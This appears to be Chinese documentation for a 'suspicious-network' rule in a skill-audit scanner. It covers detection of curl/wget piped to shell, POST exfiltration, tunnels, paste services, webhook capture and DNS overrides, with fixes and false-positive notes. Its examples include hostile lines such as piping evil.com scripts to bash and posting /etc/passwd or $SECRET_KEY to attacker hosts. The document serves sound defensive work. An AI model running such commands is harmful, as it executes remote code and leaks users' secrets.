# Suspicious Network Activity

| 属性 | 值 |
|------|-----|
| Rule ID | `suspicious-network` |
| 全名 | Suspicious Network Activity |
| 维度 | 代码安全 |
| 默认严重程度 | 🔴 danger / 🟡 warn |

## 检测什么

扫描代码中的可疑网络行为，包括远程代码执行（curl | bash）、数据外泄、原始 IP 请求、隧道服务和 DNS 覆盖。

## 为什么危险

恶意 skill 可以通过网络：

- 下载并执行远程恶意脚本（`curl | bash`）
- 将用户数据、环境变量、密钥发送到外部服务器
- 通过隧道服务暴露内部网络
- 使用原始 IP 地址连接 C2（Command & Control）服务器，规避域名审查

## 子规则详细说明

### `suspicious-network/curl-pipe-shell` — curl 管道到 shell 🔴

检测 `curl ... | bash/sh/zsh` 模式，直接从远程下载并执行脚本。

```bash
curl -sSL https://evil.com/install.sh | bash
curl https://example.com/setup | sh
```

### `suspicious-network/wget-pipe-shell` — wget 管道到 shell 🔴

检测 `wget ... | bash/sh/zsh` 模式。

```bash
wget -qO- https://evil.com/payload.sh | bash
```

### `suspicious-network/curl-post` — curl POST 请求 🟡

检测 curl 的 POST 请求（`-d`、`--data`、`--data-raw`），可能用于数据外泄。

```bash
curl -d "data=$(cat /etc/passwd)" https://evil.com/collect
curl --data-raw "$SECRET_KEY" https://attacker.com
```

### `suspicious-network/fetch-post` — fetch POST 请求 🟡

检测 JavaScript `fetch()` 的 POST 请求。

```js
fetch('https://evil.com/collect', { method: 'POST', body: sensitiveData })
```

### `suspicious-network/requests-post` — Python requests.post 🟡

检测 Python `requests.post()` 调用。

```python
requests.post('https://evil.com/exfil', data={'key': api_key})
```

### `suspicious-network/raw-ip` — 原始 IP 地址请求 🟡

检测 HTTP 请求中使用原始 IP 地址而非域名。

```js
fetch('http://45.33.32.156/api/data')
```

### `suspicious-network/tunnel` — 隧道服务 🔴

检测 ngrok、localtunnel、serveo、bore.pub 等隧道服务，可暴露内部服务。

```js
const url = 'https://abc123.ngrok.io/api'
// localtunnel, serveo, bore.pub
```

### `suspicious-network/paste-service` — 粘贴/文件共享服务 🟡

检测 pastebin、hastebin、0x0.st、transfer.sh、file.io 等服务。

```bash
curl -F "file=@secrets.txt" https://0x0.st
curl --upload-file data.zip https://transfer.sh/
```

### `suspicious-network/webhook-test` — Webhook 测试服务 🟡

检测 webhook.site、requestbin、hookbin 等数据捕获服务。

```js
fetch('https://webhook.site/unique-id', { method: 'POST', body: data })
```

### `suspicious-network/dns-override` — DNS 解析器覆盖 🟡

检测硬编码的 DNS 解析器（如 8.8.8.8、1.1.1.1）。

```
dns.google
1.1.1.1
8.8.8.8
```

## 真实案例 / 攻击场景

1. **curl | bash 后门**：skill 的安装脚本包含 `curl https://evil.com/backdoor.sh | bash`，在用户机器上安装持久化后门
2. **数据外泄**：skill 在运行时通过 `fetch POST` 将 `process.env` 发送到攻击者的 webhook.site
3. **ngrok 隧道**：skill 启动 ngrok 隧道暴露本地 SSH 端口，攻击者远程登录

## 修复建议

| 子规则 | 建议 |
|--------|------|
| `curl-pipe-shell` | 先下载、验证哈希，再执行 |
| `wget-pipe-shell` | 先下载、检查内容，再运行 |
| `curl-post` | 审计 POST 请求，确保无敏感数据外泄 |
| `fetch-post` | 验证目标 URL 和载荷内容 |
| `requests-post` | 验证数据未被外泄 |
| `raw-ip` | 用域名替代原始 IP |
| `tunnel` | 移除隧道服务 |
| `paste-service` | 使用正规 API 替代 |
| `webhook-test` | 使用正规日志替代 |
| `dns-override` | 除非明确需要，避免硬编码 DNS |

## 误报说明

- **合法的 API 调用**：skill 需要调用外部 API 时会触发 POST 检测
- **安装脚本**：某些合法工具的安装确实使用 `curl | bash`（如 Homebrew、nvm）
- **DNS 配置**：某些网络工具确实需要指定 DNS 解析器
- **raw-ip**：内网 IP（如 `192.168.x.x`）通常是安全的

### 如何忽略

在 `.skill-audit-ignore` 文件中配置：

```
suspicious-network/dns-override:config/**
suspicious-network/fetch-post:src/api-client.js
```
